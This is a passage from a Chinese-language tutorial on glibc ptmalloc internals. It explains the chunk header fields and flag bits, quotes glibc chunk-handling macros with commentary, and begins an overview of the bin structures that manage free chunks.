\u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk \u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002 \u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk , in bytes | A | M | P | mem -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here ... . . . . ( malloc_usable_size () bytes ) . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | ( size of chunk , but used for application data ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 1 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk , if unallocated ( P clear ) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` head : ' | Size of chunk , in bytes | A | 0 | P | mem -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space ( may be 0 bytes long ) . . . next . | chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ` foot : ' | Size of chunk , in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk , in bytes | A | 0 | 0 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002 \u4e00\u822c\u60c5\u51b5\u4e0b \uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */ chunk\u76f8\u5173\u5b8f \u00b6 \u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size &= ~(PREV_INUSE) \u8bbe\u7f6echunk\u7684size\u5b57\u6bb5 /* Set size at head, without disturbing its use bit */ // SIZE_BITS = 7 #define set_head_size(p, s) \\ ((p)->mchunk_size = (((p)->mchunk_size & SIZE_BITS) | (s))) /* Set size/use field */ #define set_head(p, s) ((p)->mchunk_size = (s)) /* Set size at footer (only when chunk is not in use) */ #define set_foot(p, s) \\ (((mchunkptr)((char *) (p) + (s)))->mchunk_prev_size = (s)) \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* check/set/clear inuse bits in known places */ #define inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size & PREV_INUSE) #define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size |= PREV_INUSE) #define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr)(((char *) (p)) + (s)))->mchunk_size &= ~(PREV_INUSE)) bin \u00b6 \u6982\u8ff0 \u00b6 \u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002 \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002 \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b #define NBINS 128 /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; \u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b \u542b\u4e49 bin1\u7684fd/bin2\u7684prev_size bin1\u7684bk/bin2\u7684size bin2\u7684fd/bin3\u7684prev_size bin2\u7684bk/bin3\u7684size bin\u4e0b\u6807 0 1 2 3 \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002 \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b \u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002 \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2\u4e2a\u673a\u5668\u5b57\u957f \uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148 \u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002 \u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk 